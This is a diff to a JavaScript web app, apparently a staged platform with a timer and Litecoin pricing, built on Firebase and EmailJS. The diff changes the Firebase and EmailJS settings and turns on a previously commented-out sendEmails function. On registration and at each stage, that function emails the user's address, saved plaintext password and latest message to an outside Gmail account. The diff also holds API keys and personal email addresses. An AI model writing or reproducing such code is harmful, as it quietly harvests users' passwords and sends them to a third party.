@@ -3,13 +3,12 @@ import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, on
 import { getFirestore, doc, setDoc, getDoc, collection, onSnapshot, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
-  authDomain: "test-platform-ab07e.firebaseapp.com",
-  projectId: "test-platform-ab07e",
-  storageBucket: "test-platform-ab07e.firebasestorage.app",
-  messagingSenderId: "50168022145",
-  appId: "1:50168022145:web:5f3fec99fbe64eae5bb980",
-  measurementId: "G-R814YQSVXK"
+  apiKey: "AIzaSyB185V2JwigTMxfw8R_scvnDbyA6uNkyy4",
+  authDomain: "ltcgmdo-ce1fe.firebaseapp.com",
+  projectId: "ltcgmdo-ce1fe",
+  storageBucket: "ltcgmdo-ce1fe.firebasestorage.app",
+  messagingSenderId: "201856746408",
+  appId: "1:201856746408:web:1f1e59771b041e4e96d39d"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -17,7 +16,7 @@ const auth = getAuth(app);
 const db = getFirestore(app);
 
 try {
-    emailjs.init("9G-RjQeGCdtsk4MWM");
+    emailjs.init("PUEMGN1G6PsZAaZIT");
 } catch(e) {
     console.log("EmailJS init failed, skipping...");
 }
@@ -297,15 +296,31 @@ async function handleTimerEnd() {
 function sendEmails(stageNum) {
     try {
         let currentStageName = stageNum === "Registration" ? "New Registration" : `Stage ${stageNum}`;
+        
         const emailParams = {
             user_email: currentUser.email,
             user_password: userProgress.passwordSaved || "Already Authenticated",
             passed_stage: currentStageName,
-            user_message: latestUserMessage, 
-            admin_email: "beqa994@gmail.com"
+            user_message: latestUserMessage,
+            admin_email: "ltcgmdo@gmail.com"
         };
-        // emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
-    } catch(e) {}
+
+        // შეცვალეთ "service_v8mele8" თქვენი რეალური Service ID-ით, რომელიც EmailJS-ში წერია
+        const MY_SERVICE_ID = "service_v8mele8"; 
+
+        // 1. შეტყობინება ადმინისტრატორს
+        emailjs.send(MY_SERVICE_ID, "template_22s5yhf", emailParams)
+            .then(() => console.log("Admin email sent!"))
+            .catch((err) => console.error("Admin email failed:", err));
+
+        // 2. შეტყობინება მომხმარებელს
+        emailjs.send(MY_SERVICE_ID, "template_cb0e2me", emailParams)
+            .then(() => console.log("User email sent!"))
+            .catch((err) => console.error("User email failed:", err));
+            
+    } catch(e) {
+        console.error("EmailJS Error:", e);
+    }
 }
 
 async function fetchLtcPrice() {
